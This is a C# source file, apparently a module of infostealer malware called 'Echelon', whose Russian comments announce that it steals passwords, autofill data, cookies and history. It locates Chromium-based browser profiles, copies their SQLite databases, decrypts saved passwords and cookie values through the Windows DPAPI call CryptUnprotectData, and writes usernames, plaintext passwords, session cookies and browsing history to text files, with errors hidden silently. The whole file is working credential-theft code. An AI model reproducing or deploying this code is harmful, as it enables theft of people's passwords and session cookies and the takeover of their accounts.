﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Echelon
{
    class Globalstart
    {

        public static int count = 0;
        public static int countA = 0;
        public static int countC = 0;
        public static int countH = 0;

        public static void Start(string Browsers)
        {
            //Работает с браузером

            Passwords(Browsers); // Стилим Пароли
            Autofill(Browsers); // Стилим авирзаполнение форм
            Cookies(Browsers); // Стилим куки
            History(Browsers); // Стилим Историю
        }


        public static void Passwords(string Browsers)
        {
            try
            {
                List<string> browsers = Getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        string Chromium = Browsers + "\\Chromium";
                        Directory.CreateDirectory(Chromium);
                        using (StreamWriter sw = new StreamWriter(Chromium + "\\Passwords.txt", true, Encoding.Default))
                        {
                            sw.WriteLine(string.Format("Browser - {0}\n\n", browser));

                            string browserpath = browser + "\\Login Data";
                            string rndpath = GlobalPath.AppDate + "\\System_" + rnd.Next(10000000);
                            File.Copy(browserpath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SQHandler SqlHandler = new SQHandler(rndpath);
                            SqlHandler.ReadTable("logins");
                            if (SqlHandler.GetRowCount() != 65536)
                            {
                                for (int i = 0; i < SqlHandler.GetRowCount(); i++)
                                {
                                    string password = "";

                                    try
                                    {
                                        password = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(SqlHandler.GetValue(i, 5)), null));
                                        string originUrl = SqlHandler.GetValue(i, 1);
                                        string username = SqlHandler.GetValue(i, 3);
                                        sw.Write(string.Format("URL : {0}\t\nUsername : {1}\t\nValue : {2}\t\n\n", originUrl, username, password));
                                       count++;
                                    }
                                    catch
                                    {
                                    }

                                }
                               
                                sw.WriteLine(string.Format("\n\n"));
                                File.Delete(rndpath);
                            }


                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch
            {

            }
        }


        private static List<string> Getbrowsers()
        {
            try
            {
                List<string> browsers = new List<string>();
                string[] dirs1 = Directory.GetDirectories(GlobalPath.AppDate);
                string[] dirs2 = Directory.GetDirectories(GlobalPath.LocalData);
                for (int i = 0; i < dirs1.Length; i++)
                {
                    string[] files1 = Directory.GetFiles(dirs1[i]);
                    foreach (string fs in files1)
                    {
                        if (Path.GetFileName(fs) == "Cookies")
                        {
                            browsers.Add(dirs1[i]);
                        }
                    }

                    string[] folders = Directory.GetDirectories(dirs1[i]);
                    foreach (string ff in folders)
                    {
                        string[] files2 = Directory.GetFiles(ff);
                        foreach (string fs2 in files2)
                        {
                            if (Path.GetFileName(fs2) == "Cookies")
                            {
                                browsers.Add(ff);
                            }
                        }
                        string[] foldersv2 = Directory.GetDirectories(ff);
                        foreach (string ff2 in foldersv2)
                        {
                            string[] files3 = Directory.GetFiles(ff2);
                            foreach (string fs22 in files3)
                            {
                                if (Path.GetFileName(fs22) == "Cookies")
                                {
                                    browsers.Add(ff2);
                                }
                            }
                            try
                            {
                                string[] folders3 = Directory.GetDirectories(ff2);
                                foreach (string ff3 in folders3)
                                {
                                    string[] files4 = Directory.GetFiles(ff3);
                                    foreach (string fs4 in files4)
                                    {
                                        if (Path.GetFileName(fs4) == "Cookies")
                                        {
                                            browsers.Add(ff3);
                                        }
                                    }
                                }
                            }
                            catch
                            {

                            }

                        }
                    }
                }


                for (int i = 0; i < dirs2.Length; i++)
                {
                    try
                    {
                        string[] files1 = Directory.GetFiles(dirs2[i]);
                        foreach (string fs in files1)
                        {
                            if (Path.GetFileName(fs) == "Cookies")
                            {
                                browsers.Add(dirs2[i]);
                            }
                        }
                        string[] folders = Directory.GetDirectories(dirs2[i]);
                        foreach (string ff in folders)
                        {
                            string[] files2 = Directory.GetFiles(ff);
                            foreach (string fs2 in files2)
                            {
                                if (Path.GetFileName(fs2) == "Cookies")
                                {
                                    browsers.Add(ff);
                                }
                            }
                            string[] foldersv2 = Directory.GetDirectories(ff);
                            foreach (string ff2 in foldersv2)
                            {
                                string[] files3 = Directory.GetFiles(ff2);
                                foreach (string fs22 in files3)
                                {
                                    if (Path.GetFileName(fs22) == "Cookies")
                                    {
                                        browsers.Add(ff2);
                                    }
                                }
                                try
                                {
                                    string[] folders3 = Directory.GetDirectories(ff2);
                                    foreach (string ff3 in folders3)
                                    {
                                        string[] files4 = Directory.GetFiles(ff3);
                                        foreach (string fs4 in files4)
                                        {
                                            if (Path.GetFileName(fs4) == "Cookies")
                                            {
                                                browsers.Add(ff3);
                                            }
                                        }
                                    }
                                }
                                catch
                                {

                                }

                            }
                        }
                    }
                    catch
                    {
                    }
                }




                return browsers;
            }
            catch
            {
                return null;
            }
        }
        public static void Cookies(string Browsers)
        {
            try
            {
                List<string> browsers = Getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    string Chromium = Browsers + "\\Chromium";
                    Directory.CreateDirectory(Chromium);
                    using (StreamWriter sw = new StreamWriter(Chromium + "\\Cookies.txt", true, Encoding.Default))
                    {

                        string cookiePath = browser + @"\Cookies";
                        if (File.Exists(cookiePath))
                        {
                            long lenght = new FileInfo(cookiePath).Length;
                            if (lenght < 10000 || lenght == 28672 || lenght == 20480)
                            {
                                continue;
                            }
                            string rndpath = GlobalPath.AppDate + @"\System_" + rnd.Next(10000000);
                            File.Copy(cookiePath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SQHandler SQHandler = new SQHandler(rndpath);
                            SQHandler.ReadTable("cookies");

                            for (int i = 0; i < SQHandler.GetRowCount(); i++)
                            {
                                string value = "";

                                try
                                {
                                    value = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(SQHandler.GetValue(i, 12)), null));
                                    string host_key = SQHandler.GetValue(i, 1);
                                    string name = SQHandler.GetValue(i, 2);
                                    string path = SQHandler.GetValue(i, 4);
                                    string expires_utc = SQHandler.GetValue(i, 5);
                                    string is_secure = SQHandler.GetValue(i, 6).ToUpper();
                                    if (value == "") value = SQHandler.GetValue(i, 3);
                                    sw.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", host_key, path, expires_utc, name, value));
                                    countC++;
                                }
                                catch
                                {
                                }

                            }
                            sw.WriteLine(string.Format("\n\n"));
                            File.Delete(rndpath);
                        }
                    }





                }
            }
            catch
            {

            }

        }

        public static void Autofill(string Browsers)
        {
            try
            {
                List<string> browsers = Getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        string Chromium = Browsers + "\\Chromium";
                        Directory.CreateDirectory(Chromium);
                        using (StreamWriter sw = new StreamWriter(Chromium + "\\Autofill.txt", true, Encoding.Default))
                        {
                            sw.WriteLine(string.Format("Browser - {0}\n\n", browser));
                            string browserpath = browser + @"\Web Data";
                            long lenght = new FileInfo(browserpath).Length;
                            string rndpath = GlobalPath.AppDate + @"\System_" + rnd.Next(10000000);
                            File.Copy(browserpath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SQHandler SQHandler = new SQHandler(rndpath);
                            SQHandler.ReadTable("autofill");
                            if (SQHandler.GetRowCount() != 65536)
                            {
                                for (int i = 0; i < SQHandler.GetRowCount(); i++)
                                {
                                    string value = "";

                                    try
                                    {
                                        string name = SQHandler.GetValue(i, 0);
                                        value = SQHandler.GetValue(i, 1);
                                        sw.Write(string.Format("Name : {0}\t\nValue : {1}\t\n\n", name, value));
                                        countA++;
                                    }
                                    catch
                                    {
                                    }

                                }
                                sw.WriteLine(string.Format("\n\n"));
                                File.Delete(rndpath);
                            }
                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch
            {

            }

        }
        
        public static void History(string Browsers)
        {
            try
            {
                List<string> browsers = Getbrowsers();
                Random rnd = new Random();
                foreach (string browser in browsers)
                {
                    try
                    {
                        string Chromium = Browsers + "\\Chromium";
                        Directory.CreateDirectory(Chromium);
                        using (StreamWriter sw = new StreamWriter(Chromium + "\\History.txt", true, Encoding.Default))
                        {
                            //
                            string browserpath = browser + @"\History";
                            long lenght = new FileInfo(browserpath).Length;
                            string rndpath = GlobalPath.AppDate + @"\System_" + rnd.Next(10000000);
                            File.Copy(browserpath, rndpath, true);
                            if (browser.Contains("Guest Profile") || browser.Contains("System Profile"))
                            {
                                File.Delete(rndpath);
                                continue;
                            }
                            SQHandler SQHandler = new SQHandler(rndpath);
                            SQHandler.ReadTable("urls");
                            if (SQHandler.GetRowCount() != 65536)
                            {
                                for (int i = 0; i < SQHandler.GetRowCount(); i++)
                                {
                                    try
                                    {
                                        string url = SQHandler.GetValue(i, 1);
                                        string tittle = Encoding.UTF8.GetString(Encoding.Default.GetBytes(SQHandler.GetValue(i, 2)));
                                        int visit_times = Convert.ToInt16(SQHandler.GetValue(i, 3)) + 1;
                                        sw.Write(string.Format("Site: {0}\t\nTittle: {1}\t\nVisit count: {2}\t\n\n\n", url, tittle, visit_times));
                                        countH++;
                                    }
                                    catch
                                    {
                                    }

                                }
                                sw.WriteLine(string.Format("\n\n"));
                                File.Delete(rndpath);
                            }

                        }
                    }
                    catch
                    {
                        continue;
                    }

                }
            }
            catch
            {

            }

        }

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            DataBlob pPlainText = new DataBlob();
            DataBlob pCipherText = new DataBlob();
            DataBlob pEntropy = new DataBlob();
            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch
                {
                }
                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch
                {
                }
                CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch
            {
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }



    }
}
